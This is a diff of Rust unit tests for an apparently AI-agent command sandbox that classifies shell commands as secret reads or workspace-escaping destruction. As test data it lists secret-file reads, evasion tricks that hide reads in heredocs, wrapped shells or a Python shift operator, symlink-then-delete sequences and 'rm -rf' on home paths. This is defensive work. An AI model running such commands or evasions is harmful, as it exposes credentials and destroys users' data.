@@ -9959,6 +11283,79 @@ subprocess.run('ls\x3b id', shell=True)",
         }
     }
 
+    #[test]
+    fn executing_policy_opens_workspace_logs_only_when_enforced() {
+        use crate::runtime::agent_sandbox::{policy_from, PolicyInputs, SandboxMode};
+        let home = Path::new("/home/user/.lucidos");
+        let policy = policy_from(&PolicyInputs {
+            lucidos_home: Some(home.into()),
+            data_dirs: vec![home.join("gateway"), PathBuf::from("/srv/second-install")],
+            workspaces: vec![],
+        });
+        for mode in [
+            Some(SandboxMode::Enforced),
+            Some(SandboxMode::Inherited),
+            Some(SandboxMode::OwnerOptedOut),
+            Some(SandboxMode::PermittedOutside),
+            None,
+        ] {
+            let paths = SecretPaths::for_policy(&policy, mode);
+            let enforced = mode == Some(SandboxMode::Enforced);
+            for path in ["/home/user/.lucidos/gateway/workspaces/tour-film-demo/.lucidos/diagnostic-log/diagnostic-log.jsonl", "/srv/second-install/workspaces/demo/log", "/srv/second-install//workspaces/./demo/log"] {
+                assert_eq!(paths.mentions(path), !enforced, "{mode:?}: {path}");
+            }
+            for path in [
+                "/srv/second-install/config/key",
+                "/srv/second-install/workspaces:archive/key",
+                "/srv/second-install/workspacesé/key",
+                "/srv/second-install/workspaces*/key",
+                "cat '/srv/second-install/workspaces archive/key'",
+                "/srv/second-install/workspaces/demo/../../config/key",
+                "/srv/second-install/workspaces/demo/.. -n",
+                "cat '/srv/second-install/workspaces/a b/../../config/key'",
+                "/home/user/.lucidos/local-token",
+                "/home/user/.lucidos/paired-devices.json",
+                ".lucidos/private/local-token",
+                "~/.lucidos/gateway/gateway.log",
+                "/home/user/.lucidos/gateway/workspaces/demo/.lucidos/private/local-token",
+            ] {
+                assert!(paths.mentions(path), "{mode:?}: {path}");
+            }
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn classifier_adds_resolved_roots_and_every_home_form() {
+        use crate::runtime::agent_sandbox::SandboxMode;
+        let scratch = tempfile::tempdir().unwrap();
+        let real = scratch.path().join("real");
+        std::fs::create_dir_all(real.join("workspaces/demo")).unwrap();
+        let alias = scratch.path().join("alias");
+        std::os::unix::fs::symlink(&real, &alias).unwrap();
+        let home = home_dir().unwrap();
+        let gateway = home.join(".lucidos/gateway");
+        let policy = lucidos_agent_sandbox::Policy {
+            hidden: vec![alias.clone(), gateway.clone()],
+            open_within_hidden: vec![alias.join("workspaces"), gateway.join("workspaces")],
+            ..Default::default()
+        };
+        for mode in [Some(SandboxMode::Enforced), None] {
+            let paths = SecretPaths::for_policy(&policy, mode);
+            for root in policy.resolved().hidden {
+                assert!(paths.mentions(&format!("{}/config/key", root.display())));
+                assert_eq!(
+                    paths.mentions(&format!("{}/workspaces/demo/log", root.display())),
+                    mode.is_none()
+                );
+            }
+            for prefix in ["~", "$HOME", "${HOME}", ""] {
+                let path = format!("{prefix}/.lucidos/gateway/workspaces/demo/log");
+                assert_eq!(paths.mentions(&path), mode.is_none(), "{path}");
+            }
+        }
+    }
+
     const SECRET_READS: [&str; 13] = [
         "cat ~/.lucidos/snapshots/demo/snap_test/db.dump",
         "ls ${HOME}/.lucidos//./snapshots",
@@ -9987,6 +11384,168 @@ subprocess.run('ls\x3b id', shell=True)",
         ] {
             assert_eq!(python(code), want, "{code}");
         }
+    }
+
+    /// Reads of the gateway data dir an agent really ran while debugging, plus
+    /// each home form. The log sits beside keys and pairing state, so it stays
+    /// a secret read that no grant covers.
+    const GATEWAY_LOG_READS: [&str; 10] = [
+        r#"ls -t ~/.lucidos/gateway | head; f=$(ls -t ~/.lucidos/gateway/*.log ~/.lucidos/gateway/*/*.log 2>/dev/null | head -3); echo "$f""#,
+        r#"L=~/.lucidos/gateway/gateway.log; ls -la $L; grep -a "\[Voice\]" $L | grep -aE "2026-11-11[T ]20:(2[3-9])" | cut -c1-260 | head -60"#,
+        r#"L=~/.lucidos/gateway/gateway.log; grep -a "\[Voice\]" $L | tail -3 | cut -c1-300; echo; grep -a "\[Voice\]" $L | grep -a "floor" | tail -20 | cut -c1-260"#,
+        r#"L=~/.lucidos/gateway/gateway.log; grep -a "pid:77210" $L | grep -aE "^21:(2[3-9])" | grep -av timing_log | grep -aiE "voice|call|live" | cut -c1-280 | head -70"#,
+        r#"L=~/.lucidos/gateway/gateway.log; grep -a "pid:77210" $L | head -400 | grep -aiE "commit|version|build|sha|started" | head -8 | cut -c1-250; echo ---; grep -a "\[pid:" $L | tail -1 | cut -c1-120"#,
+        r#"L=~/.lucidos/gateway/gateway.log; grep -a "pid:77210" $L | grep -aE "^21:(28|17|18)" | grep -av -E "timing_log|responses|Memory|AgentLoop|scroll" | grep -aiE "voice|call|live|chat" | cut -c1-260 | head -30"#,
+        r#"L=~/.lucidos/gateway/gateway.log; grep -a "pid:77210" $L | grep -aE "^21:(25:(19|2[0-9]|3[0-9])|28:(1[3-9]|2[0-2]))" | cut -c1-240 | head -40"#,
+        "tail -n 50 $HOME/.lucidos/gateway/gateway.log",
+        "grep Voice ${HOME}/.lucidos/gateway/gateway.log",
+        "tail /Users/me/.lucidos/gateway/gateway.log",
+    ];
+
+    #[test]
+    fn a_gateway_log_read_is_a_secret_read_no_grant_covers() {
+        let want = StaticVerdict::SettledIrreversible(SideEffectCategory::SecretRead);
+        let all = |_: &str| true;
+        for cmd in GATEWAY_LOG_READS {
+            assert_eq!(bash(cmd), want, "{cmd}");
+            for tool in ["Bash", "command_execution"] {
+                assert!(
+                    !grant_covers_command(tool, cmd, TEXT_ONLY, &TrustedHeads::NONE, all),
+                    "{tool}: {cmd}"
+                );
+            }
+        }
+    }
+
+    /// A handoff narrative line that names a secret path as document text.
+    const NARRATIVE: &str = "- Do NOT read `~/.lucidos/gateway/gateway.log` or other raw logs.\n";
+
+    /// The second evidence command: a literal narrative, then a verb reading
+    /// it as a file.
+    fn handoff_command() -> String {
+        format!(
+            "cat > /tmp/h.md <<'EOF'\n{NARRATIVE}EOF\n\
+             lucidos successor start --narrative /tmp/h.md --at phase-commit --progress 1/7"
+        )
+    }
+
+    /// `script` as Codex renders argv: one `-c` operand of joined single-quoted
+    /// runs, each `'` written as `'\''`.
+    fn codex_wrapped(script: &str) -> String {
+        format!("/bin/zsh -lc '{}'", script.replace('\'', r"'\''"))
+    }
+
+    #[test]
+    fn a_literal_heredoc_body_nothing_runs_is_not_a_secret_read() {
+        for cmd in [
+            format!(
+                "N=\"${{TMPDIR:-/tmp}}/h.md\"; cat > \"$N\" <<'EOF'\n{NARRATIVE}EOF\n\
+                 lucidos successor start --narrative \"$N\" --at phase-commit --progress 1/7"
+            ),
+            handoff_command(),
+            format!("cat > /tmp/h.md <<\"EOF\"\n{NARRATIVE}EOF"),
+            format!("cat > /tmp/h.md <<\\EOF\n{NARRATIVE}EOF"),
+            format!("cat > /tmp/h.md <<-'EOF'\n\t{NARRATIVE}\tEOF"),
+            format!(
+                "cat > /tmp/h.md <<'EOF'\r\n{}EOF\r\n",
+                NARRATIVE.replace('\n', "\r\n")
+            ),
+            format!("mkdir -p /tmp/h && cat > /tmp/h/h.md <<'EOF'\n{NARRATIVE}EOF"),
+            format!("tee /tmp/h.md >/dev/null <<'EOF'\n{NARRATIVE}EOF"),
+            format!("lucidos data write artifacts/h.md <<'EOF'\n{NARRATIVE}EOF"),
+            codex_wrapped(&handoff_command()),
+        ] {
+            assert!(!command_reads_secret(&cmd), "{cmd}");
+            assert_ne!(
+                bash(&cmd),
+                StaticVerdict::SettledIrreversible(SideEffectCategory::SecretRead),
+                "{cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_heredoc_that_reads_or_runs_a_secret_path_stays_a_secret_read() {
+        let read = "cat ~/.lucidos/secret-keys/db\n";
+        let script = format!("cat > /tmp/x.sh <<'EOF'\n{read}EOF\n");
+        let all = |_: &str| true;
+        for cmd in [
+            // A real read, an input redirect, a here-string, a secret target.
+            "cat ~/.lucidos/gateway/gateway.log".to_string(),
+            "grep x $HOME/.lucidos/secret-keys/db".into(),
+            "cat < ~/.lucidos/secret-keys/db".into(),
+            "while read l; do :; done < ~/.lucidos/gateway/gateway.log".into(),
+            "cat <<< ~/.lucidos/secret-keys/db".into(),
+            "cat > ~/.lucidos/secret-keys/db <<'EOF'\nx\nEOF".into(),
+            format!("cat > /tmp/h.md <<'EOF' ~/.lucidos/secret-keys/db\n{NARRATIVE}EOF"),
+            // An unquoted body expands, so its text is scanned.
+            "cat > /tmp/h.md <<EOF\n$(cat ~/.lucidos/secret-keys/db)\nEOF".into(),
+            "cat > /tmp/h.md <<EOF\n`cat ~/.lucidos/secret-keys/db`\nEOF".into(),
+            format!("cat > /tmp/h.md <<EOF\n{NARRATIVE}EOF"),
+            // A head that runs the body.
+            format!("bash <<'EOF'\n{read}EOF"),
+            format!("sh -s <<'EOF'\n{read}EOF"),
+            "python3 - <<'EOF'\nprint(open('/Users/me/.lucidos/secret-keys/db').read())\nEOF"
+                .into(),
+            format!(". /dev/stdin <<'EOF'\n{read}EOF"),
+            format!("cat <<'EOF' | sh\n{read}EOF"),
+            format!("env cat > /tmp/h.md <<'EOF'\n{NARRATIVE}EOF"),
+            format!("/bin/cat > /tmp/h.md <<'EOF'\n{NARRATIVE}EOF"),
+            format!("BASH_ENV=/tmp/x cat > /tmp/h.md <<'EOF'\n{NARRATIVE}EOF"),
+            // A sink name redefined as a function that runs its input.
+            format!("cat () ( bash )\ncat <<'EOF'\n{read}EOF"),
+            format!("cat () {{ bash; }}\ncat <<'EOF'\n{read}EOF"),
+            // A CRLF opener: the shell's delimiter keeps its `\r`.
+            format!("cat > /tmp/h.md <<'EOF'\r\nnotes\r\nEOF\r\n{read}EOF"),
+            // A body written as a script, then run in the same command.
+            format!("{script}bash /tmp/x.sh"),
+            format!("{script}chmod +x /tmp/x.sh && /tmp/x.sh"),
+            format!("cat > /tmp/x.md <<'EOF'\n{read}EOF\nsource /tmp/x.md"),
+            codex_wrapped(&format!("{script}bash /tmp/x.sh")),
+            // A substitution beside the body.
+            format!("cat > /tmp/h.md <<'EOF'\n{NARRATIVE}EOF\necho $(date)"),
+            // A nested shell, and a wrapper the outer shell expands.
+            "bash -c 'cat ~/.lucidos/secret-keys/db'".into(),
+            "bash -c \"cat > f <<'EOF'\n$(cat ~/.lucidos/secret-keys/db)\nEOF\"".into(),
+            format!(
+                "/bin/zsh -lc \"{}\"",
+                handoff_command().replace('"', "\\\"")
+            ),
+            // A wrapper tail the script reads.
+            "bash -c 'cat \"$1\"' _ ~/.lucidos/secret-keys/db".into(),
+            // Shapes the body walk cannot place.
+            format!("cat > /tmp/h.md <<'EOF'\n{NARRATIVE}"),
+            format!("echo ${{x:-<<}}\ncat > /tmp/h.md <<'EOF'\n{NARRATIVE}EOF"),
+            format!("# note\ncat > /tmp/h.md <<'EOF'\n{NARRATIVE}EOF"),
+        ] {
+            assert!(command_reads_secret(&cmd), "{cmd}");
+            assert_eq!(
+                bash(&cmd),
+                StaticVerdict::SettledIrreversible(SideEffectCategory::SecretRead),
+                "{cmd}"
+            );
+            for tool in ["Bash", "command_execution"] {
+                assert!(
+                    !grant_covers_command(tool, &cmd, TEXT_ONLY, &TrustedHeads::NONE, all),
+                    "{tool}: {cmd}"
+                );
+            }
+        }
+    }
+
+    /// Python's `<<` is a shift, so a `cat` object with `__lshift__` runs the
+    /// lines a shell would read as a heredoc body.
+    #[test]
+    fn python_shaped_like_a_heredoc_stays_a_secret_read() {
+        let code = "cat = type('', (), {'__lshift__': lambda s, o: s})()\n\
+                    cat <<'EOF'\n\
+                    print(open('/Users/me/.lucidos/secret-keys/db').read())\n\
+                    EOF";
+        assert!(python_reads_secret(code));
+        assert_eq!(
+            python(code),
+            StaticVerdict::SettledIrreversible(SideEffectCategory::SecretRead)
+        );
     }
 
     #[test]
@@ -10076,6 +11635,28 @@ subprocess.run('ls\x3b id', shell=True)",
         assert!(SideEffectCategory::Other.is_grantable());
         assert!(serde_json::to_value(SideEffectCategory::SecretRead).is_err());
         assert!(serde_json::from_value::<SideEffectCategory>(json!("secret_read")).is_err());
+    }
+
+    /// Only the floor's fallback catches this command. Chat asks for it on a
+    /// card no grant covers. A trigger grant cannot name the category.
+    #[test]
+    fn an_unproven_floor_match_asks_and_no_grant_covers_it() {
+        let category = SideEffectCategory::UnprovenWorkspaceDestruction;
+        assert!(!category.is_grantable());
+        assert!(serde_json::to_value(category).is_err());
+        let command =
+            "cat > fixture.rs <<'EOF'\npg_ctl -D /tmp/lucidos_example stop\nEOF\ncargo fmt --all";
+        assert_eq!(
+            static_classify(tn::RUN_BASH, &json!({ "command": command }), TEXT_ONLY),
+            StaticVerdict::SettledIrreversible(category)
+        );
+        assert!(!grant_covers_command(
+            "Bash",
+            command,
+            TEXT_ONLY,
+            &TrustedHeads::NONE,
+            |_| true
+        ));
     }
 
     /// The grant lane's coverage rule, shared with the chat lane so the two
@@ -10474,7 +12055,191 @@ subprocess.run('ls\x3b id', shell=True)",
         assert_eq!(static_side_effect_category("rm -rf /etc/x"), None);
     }
 
+    #[test]
+    fn phase4_marker_separates_scratch_outside_and_doubt() {
+        let d = disk();
+        std::os::unix::fs::symlink("missing", d.ws.join("dangling")).unwrap();
+        std::os::unix::fs::symlink("loop", d.ws.join("loop")).unwrap();
+        for command in [
+            "unknown /tmp/log.json",
+            "unknown /var/tmp/log.json",
+            "rm dangling",
+            "rm loop",
+            "unknown; rm data/sub/a.txt",
+            "cd $DEST; rm data/sub/a.txt",
+        ] {
+            let StaticVerdict::NeedsJudge(input) = d.static_lane(command) else {
+                panic!("expected judge: {command}");
+            };
+            assert!(!input.out_of_workspace, "{command}");
+            if command.contains("rm ") {
+                assert_eq!(
+                    fallback_classify(&input, CommandSite::Workspace(&d.ws)).lane,
+                    RiskLane::IrreversibleDanger,
+                    "unresolved must ask: {command}"
+                );
+            }
+        }
+        d.link("outside", &d.outside);
+        for command in ["rm data/outside/keep.txt", "unknown /etc/hosts"] {
+            let StaticVerdict::NeedsJudge(input) = d.static_lane(command) else {
+                panic!("expected judge: {command}");
+            };
+            assert!(input.out_of_workspace, "{command}");
+        }
+    }
+
+    #[test]
+    fn phase4_locations_resolve_disk_links_without_treating_doubt_as_outside() {
+        let d = disk();
+        d.link("out", &d.outside);
+        d.link("inside", &d.ws.join("data/sub"));
+        d.link("dangling", &d.ws.join("missing"));
+        std::fs::hard_link(d.ws.join("data/sub/a.txt"), d.ws.join("hard")).unwrap();
+        let scratch = scratch_dir();
+        let log = scratch.path().join("run.log");
+        CommandSite::Workspace(&d.ws).with_disk(|disk| {
+            for (target, expected) in [
+                ("data/sub/new.txt".to_string(), PathLocation::Workspace),
+                ("data/inside/a.txt".to_string(), PathLocation::Unresolved), // hard-linked target
+                ("data/out/keep.txt".to_string(), PathLocation::Outside),
+                ("data/dangling/x".to_string(), PathLocation::Unresolved),
+                ("hard".to_string(), PathLocation::Unresolved),
+                (log.to_string_lossy().into_owned(), PathLocation::Scratch),
+            ] {
+                assert_eq!(
+                    path_location(&target, Some(&d.ws), disk),
+                    expected,
+                    "{target}"
+                );
+            }
+        });
+    }
+
+    #[test]
+    fn a_path_that_may_be_in_the_workspace_or_in_scratch_is_unresolved_in_either_order() {
+        let d = disk();
+        let scratch = scratch_dir();
+        CommandSite::Workspace(&d.ws).with_disk(|disk| {
+            let root = disk.unwrap().root;
+            let (ws, tmp) = (root.to_path_buf(), scratch.path().to_path_buf());
+            for cwds in [[ws.clone(), tmp.clone()], [tmp.clone(), ws.clone()]] {
+                let mixed = Some(OnDisk { root, cwds: &cwds });
+                assert_eq!(
+                    path_location("new.txt", Some(&d.ws), mixed),
+                    PathLocation::Unresolved,
+                    "{cwds:?}"
+                );
+            }
+            std::fs::create_dir(tmp.join("sub")).unwrap();
+            let both_scratch = [tmp.clone(), tmp.join("sub")];
+            let scratch_only = Some(OnDisk {
+                root,
+                cwds: &both_scratch,
+            });
+            assert_eq!(
+                path_location("new.txt", Some(&d.ws), scratch_only),
+                PathLocation::Scratch
+            );
+        });
+    }
+
     // --- On-disk containment (a workspace site) -----------------------------
+
+    #[test]
+    fn script_sources_are_bounded_private_and_cache_sensitive() {
+        let d = disk();
+        std::fs::create_dir_all(d.ws.join("scripts")).unwrap();
+        std::fs::create_dir_all(d.ws.join(".hidden")).unwrap();
+        std::fs::write(d.ws.join(".hidden/task.py"), "HIDDEN").unwrap();
+        std::fs::write(d.outside.join("task.py"), "OUTSIDE").unwrap();
+        d.link("task.py", &d.outside.join("task.py"));
+        for n in 1..=4 {
+            std::fs::write(d.ws.join(format!("scripts/{n}.py")), format!("print({n})")).unwrap();
+        }
+        let judge = |cmd: &str| {
+            let StaticVerdict::NeedsJudge(input) = d.static_lane(cmd) else {
+                panic!("judge expected")
+            };
+            input
+        };
+        let input = judge("python3 data/task.py; python3 .hidden/task.py; python3 scripts/1.py; python3 scripts/2.py; python3 scripts/3.py; python3 scripts/4.py");
+        let state = super::super::command_judge_questions::state(&input);
+        let shown = state["script_sources"].to_string();
+        assert!(!shown.contains("OUTSIDE") && !shown.contains("HIDDEN"));
+        assert!(shown.contains("print(1)") && shown.contains("print(3)"));
+        assert!(!shown.contains("print(4)"));
+        assert!(shown.contains("skipped: file limit"));
+        let before = judge("python3 scripts/1.py");
+        std::fs::write(d.ws.join("scripts/1.py"), "print(99)").unwrap();
+        let after = judge("python3 scripts/1.py");
+        let cache = std::collections::HashMap::from([(before.cache_key(), true)]);
+        assert!(!cache.contains_key(&after.cache_key()));
+        assert!(judge("python3 -u scripts/1.py").script_sources[0]
+            .source
+            .contains("print(99)"));
+        std::fs::write(
+            d.ws.join("scripts/1.py"),
+            "x".repeat(SCRIPT_SOURCE_BYTES + 10),
+        )
+        .unwrap();
+        let large = judge("python3 scripts/1.py; python3 scripts/2.py");
+        assert!(large.script_sources[0].source.is_empty());
+        assert_eq!(large.script_sources[0].status, "skipped: byte limit");
+        assert!(large.script_sources[1].source.contains("print(2)"));
+        std::fs::write(
+            d.ws.join("scripts/1.py"),
+            "postgresql://u:sample-secret@db.example.test/app",
+        )
+        .unwrap();
+        let redacted = judge("python3 scripts/1.py");
+        assert!(!super::super::command_judge_questions::state(&redacted)
+            .to_string()
+            .contains("sample-secret"));
+        assert_eq!(before.out_of_workspace, after.out_of_workspace);
+        assert_eq!(before.fast_path_refused, after.fast_path_refused);
+        std::fs::write(
+            d.ws.join("scripts/1.py"),
+            "postgresql://u:x@db.example.test/app\n".repeat(400),
+        )
+        .unwrap();
+        let expanded = judge("python3 scripts/1.py");
+        assert!(
+            expanded
+                .script_sources
+                .iter()
+                .map(|s| s.source.len())
+                .sum::<usize>()
+                <= SCRIPT_SOURCE_BYTES
+        );
+        assert!(matches!(
+            d.static_lane("echo safe"),
+            StaticVerdict::Settled(RiskLane::Safe)
+        ));
+        assert!(judge("cd scripts; python3 1.py").script_sources.is_empty());
+        let paths = SecretPaths {
+            private: vec![],
+            hidden: vec![d.ws.join("scripts").to_string_lossy().into_owned()],
+            open: vec![d.ws.join("scripts").to_string_lossy().into_owned()],
+            text_gate: false,
+        };
+        let StaticVerdict::NeedsJudge(private) = static_classify_with_paths(
+            tn::RUN_BASH,
+            &json!({"command": "python3 scripts/1.py"}),
+            CommandSite::Workspace(&d.ws),
+            &TrustedHeads::NONE,
+            &paths,
+        ) else {
+            panic!("judge expected")
+        };
+        assert!(private.script_sources.is_empty());
+        let mut without_source = redacted.clone();
+        without_source.script_sources.clear();
+        assert_eq!(
+            fallback_classify(&redacted, CommandSite::Workspace(&d.ws)),
+            fallback_classify(&without_source, CommandSite::Workspace(&d.ws))
+        );
+    }
 
     /// A workspace holding `data/sub/a.txt`, beside an `outside` directory
     /// holding `keep.txt`. The temp dir is held so it outlives the test.
@@ -10485,7 +12250,7 @@ subprocess.run('ls\x3b id', shell=True)",
     }
 
     fn disk() -> Disk {
-        let dir = tempfile::tempdir().unwrap();
+        let dir = tempfile::tempdir_in(std::env::current_dir().unwrap()).unwrap();
         let ws = dir.path().join("ws");
         let outside = dir.path().join("outside");
         std::fs::create_dir_all(ws.join("data/sub")).unwrap();
@@ -10520,6 +12285,7 @@ subprocess.run('ls\x3b id', shell=True)",
                     command: cmd.to_string(),
                     out_of_workspace: false,
                     fast_path_refused: false,
+                    script_sources: vec![],
                 },
                 CommandSite::Workspace(&self.ws),
             )
@@ -10537,6 +12303,21 @@ subprocess.run('ls\x3b id', shell=True)",
                 panic!("{cmd} must reach the judge");
             };
             assert!(ji.out_of_workspace, "{cmd} must carry the marker");
+        }
+
+        /// The guard cannot place the target. The command asks, and nothing
+        /// claims a path outside.
+        fn assert_asks_in_doubt(&self, cmd: &str) {
+            let c = self.fallback(tn::RUN_BASH, cmd);
+            assert_eq!(c.lane, RiskLane::IrreversibleDanger, "{cmd}");
+            assert_eq!(c.category, Some(SideEffectCategory::Other), "{cmd}");
+        }
+
+        fn assert_unmarked(&self, cmd: &str) {
+            let StaticVerdict::NeedsJudge(ji) = self.static_lane(cmd) else {
+                panic!("{cmd} must reach the judge");
+            };
+            assert!(!ji.out_of_workspace, "{cmd} must not carry the marker");
         }
 
         fn assert_checkpointed(&self, cmd: &str) {
@@ -10729,23 +12510,28 @@ subprocess.run('ls\x3b id', shell=True)",
                 disk,
                 home
             ));
-            for path in ["~/outside/", "~", "~root/ws/"] {
+            for path in ["~/outside/", "~"] {
                 assert_eq!(
                     python_destruction_scope(&py(path), None, disk, home),
                     Some(DestructionScope::OutOfWorkspace),
                     "{path}"
                 );
             }
+            // Another user's home cannot be placed.
+            assert_eq!(
+                python_destruction_scope(&py("~root/ws/"), None, disk, home),
+                Some(DestructionScope::Unresolved)
+            );
             assert!(command_names_path_outside(
                 "cp data/sub/a.txt ~/outside/b.txt",
                 None,
                 disk,
                 home
             ));
-            // With no home, `~` cannot be shown inside.
+            // With no home, `~` cannot be placed.
             assert_eq!(
                 python_destruction_scope(&py("~/ws/"), None, disk, None),
-                Some(DestructionScope::OutOfWorkspace)
+                Some(DestructionScope::Unresolved)
             );
         });
         // An absolute literal into the workspace stays inside, so the judge-off
@@ -10804,10 +12590,10 @@ subprocess.run('ls\x3b id', shell=True)",
         );
     }
 
-    /// The safe rule for what an unresolvable path means: it reads as
-    /// outside, never as inside.
+    /// The safe rule for what an unresolvable path means: it is doubt. It
+    /// never reads as inside, and it is no evidence of a path outside.
     #[test]
-    fn a_path_that_does_not_resolve_reads_as_outside() {
+    fn a_path_that_does_not_resolve_asks_without_the_marker() {
         let d = disk();
         d.link("dangling", &d.outside.join("missing"));
         d.link("loop", &d.ws.join("data/loop"));
@@ -10816,7 +12602,8 @@ subprocess.run('ls\x3b id', shell=True)",
             "rm -rf data/loop/x",
             "rm -rf data/dangling/x",
         ] {
-            d.assert_escapes(cmd);
+            d.assert_asks_in_doubt(cmd);
+            d.assert_unmarked(cmd);
         }
         let gone = Disk {
             ws: d.ws.join("no-such-root"),
@@ -10840,20 +12627,21 @@ subprocess.run('ls\x3b id', shell=True)",
             "rm -rf data/*",
             "cd data && rm -rf *",
         ] {
-            d.assert_escapes(cmd);
+            d.assert_asks_in_doubt(cmd);
         }
     }
 
-    /// Quoting or an escape inside a word hides the path a whitespace split
-    /// sees, so such a word cannot be resolved and reads as outside.
+    /// Quoting or an escape inside a word does not hide a link: the word is
+    /// read as the shell reads it. A word the split cuts short is doubt.
     #[test]
     fn a_quoted_word_cannot_hide_a_symlink() {
         let d = disk();
         d.link("x", &d.outside);
         d.link("hosts", &d.outside.join("keep.txt"));
+        d.assert_asks_in_doubt(r#"echo x > "data/my link/keep.txt""#);
+        d.assert_asks_in_doubt(r#"rm -rf "data/my link/keep.txt""#);
         for cmd in [
             r#"echo x > data/"x/keep.txt""#,
-            r#"echo x > "data/my link/keep.txt""#,
             r"echo x > data/\x/keep.txt",
             r#"rm -rf "data/x"/*"#,
             r#"rm -rf data/"x"/*"#,
@@ -10882,7 +12670,7 @@ subprocess.run('ls\x3b id', shell=True)",
             "cp -r data/sub .*",
             "mv data/sub {x,..}",
         ] {
-            d.assert_escapes(cmd);
+            d.assert_asks_in_doubt(cmd);
         }
     }
 
@@ -10909,14 +12697,14 @@ subprocess.run('ls\x3b id', shell=True)",
             "rm -rf data/x/* & ln -s ../outside data/x",
             "echo $(ln -s ../outside data/x) > data/x/keep.txt",
         ] {
-            d.assert_escapes(cmd);
+            d.assert_asks_in_doubt(cmd);
         }
     }
 
     /// A link made earlier in the same line does not exist yet when the line
-    /// is classified, so no resolution can see it.
+    /// is classified, so no resolution can see it. The delete is doubt.
     #[test]
-    fn a_link_made_in_the_same_line_makes_destruction_escape() {
+    fn a_link_made_in_the_same_line_puts_destruction_in_doubt() {
         let d = disk();
         for cmd in [
             "ln -s ../outside data/x && rm -rf data/x/*",
@@ -10926,17 +12714,19 @@ subprocess.run('ls\x3b id', shell=True)",
             "true && bash -c 'ln -s ../outside data/x; rm -rf data/x/*'",
             "python3 -c 'import os; os.symlink(\"../outside\", \"data/x\")' && rm -rf data/x/*",
         ] {
-            d.assert_escapes(cmd);
+            d.assert_asks_in_doubt(cmd);
         }
     }
 
     /// A write to a file with a second hard link lands under the other name.
+    /// Where that name lies is unknown, so it is doubt and sets no marker.
     #[test]
-    fn a_hard_link_out_of_the_workspace_makes_destruction_escape() {
+    fn a_hard_link_puts_destruction_in_doubt() {
         let d = disk();
         std::fs::hard_link(d.outside.join("keep.txt"), d.ws.join("data/h")).unwrap();
         for cmd in ["echo x > data/h", "truncate -s 0 data/h"] {
-            d.assert_escapes(cmd);
+            d.assert_asks_in_doubt(cmd);
+            d.assert_unmarked(cmd);
         }
     }
 
@@ -10992,7 +12782,8 @@ subprocess.run('ls\x3b id', shell=True)",
         d.link("g", &d.ws.join(".git"));
         let after = judged(&d);
         assert!(!before.fast_path_refused && after.fast_path_refused);
-        assert_ne!(before.cache_key(), after.cache_key());
+        let cache = std::collections::HashMap::from([(before.cache_key(), true)]);
+        assert!(!cache.contains_key(&after.cache_key()));
     }
 
     /// Python resolves its string literals too, but expands no glob.
@@ -11243,6 +13034,101 @@ subprocess.run('ls\x3b id', shell=True)",
             |p: &str| { p == "Bash(cat:*)" || p == "Bash" }
         ));
     }
+
+    /// A destructive head with no operand still destroys: its targets arrive
+    /// on stdin. After a move out, it destroys out there.
+    #[test]
+    fn an_operandless_delete_is_still_destruction() {
+        let d = disk();
+        d.assert_checkpointed("git ls-files | xargs rm");
+        let out = d.outside.display();
+        d.assert_escapes(&format!("cd {out}; ls | xargs rm -rf"));
+    }
+
+    /// A `cd` into a missing temp directory fails, so the delete runs here.
+    #[test]
+    fn a_move_into_a_missing_temp_directory_exempts_nothing() {
+        let d = disk();
+        let scratch = scratch_dir();
+        let gone = scratch.path().join("no-such-dir");
+        d.assert_asks_in_doubt(&format!("cd {}; rm -rf *", gone.display()));
+    }
+
+    /// `$HOME` is the one expansion the guard places, in every consumer.
+    #[test]
+    fn a_home_variable_target_is_outside_evidence() {
+        let d = disk();
+        d.assert_escapes(r#"rm -rf "$HOME"/Documents"#);
+        d.assert_escapes("rm -rf ${HOME}/Documents");
+    }
+
+    /// Link doubt never downgrades a confirmed move out of the workspace.
+    #[test]
+    fn a_possible_link_never_downgrades_a_move_out() {
+        let d = disk();
+        let out = d.outside.display();
+        d.assert_escapes(&format!("cd {out} && ln -s a b && rm -rf Documents"));
+        d.assert_escapes(&format!("cd {out} && ln -s a b && echo x > .zshrc"));
+    }
+}
+
+#[cfg(test)]
+mod relocated_secret_tests {
+    use super::*;
+
+    const USER_HOME: &str = "/home/user";
+
+    fn guards(moved: &str, text: &str) -> bool {
+        let secrets = secret_paths(Some(PathBuf::from(moved)), Some(Path::new(USER_HOME)));
+        mentions_any_path(&secrets, text)
+    }
+
+    #[test]
+    fn a_moved_private_subtree_is_a_secret_path() {
+        let read = "cat /tmp/e2e-root/private/secret-keys/k";
+        assert!(!mentions_any_path(
+            &secret_paths(None, Some(Path::new(USER_HOME))),
+            read
+        ));
+        assert!(guards("/tmp/e2e-root/private", read));
+        assert!(!guards(
+            "/tmp/e2e-root/private",
+            "cat /tmp/e2e-root/private-notes"
+        ));
+    }
+
+    #[test]
+    fn a_moved_subtree_under_the_home_matches_every_home_form() {
+        let moved = "/home/user/.lucidos/e2e-root/private";
+        for read in [
+            "cat /home/user/.lucidos/e2e-root/private/local-token",
+            "cat ~/.lucidos/e2e-root/private/local-token",
+            "cat \"$HOME/.lucidos/e2e-root/private\"/local-token",
+            "cat ${HOME}/.lucidos/e2e-root/private/local-token",
+        ] {
+            assert!(guards(moved, read), "{read}");
+        }
+    }
+
+    #[test]
+    fn a_shallow_moved_subtree_does_not_match_every_private_dir() {
+        assert!(guards("/home/user/private", "cat ~/private/local-token"));
+        assert!(!guards(
+            "/home/user/private",
+            "cat /srv/project/private/notes"
+        ));
+    }
+
+    #[test]
+    fn a_trailing_slash_or_doubled_slash_cannot_hide_the_moved_subtree() {
+        for moved in ["/tmp/e2e-root/private/", "/tmp//e2e-root/./private"] {
+            assert!(
+                guards(moved, "cat /tmp/e2e-root/private/secret-keys/k"),
+                "{moved}"
+            );
+            assert!(guards(moved, "tar czf - /tmp/e2e-root/private"), "{moved}");
+        }
+    }
 }
 
 #[cfg(test)]
@@ -11345,7 +13231,8 @@ mod mcp_setup_tests {
     #[test]
     fn a_server_spawned_outside_the_workspace_reads_after_a_cd() {
         let ws = tempfile::tempdir().unwrap();
-        let elsewhere = tempfile::tempdir().unwrap();
+        // Outside every scratch root: a temp directory reads as doubt.
+        let elsewhere = tempfile::tempdir_in(std::env::current_dir().unwrap()).unwrap();
         let input = setup("rm", &["-rf", "data"], json!(null));
         let line = mcp_setup_command_line(
             tn::SETUP_MCP_SERVER,
@@ -11372,6 +13259,23 @@ mod mcp_setup_tests {
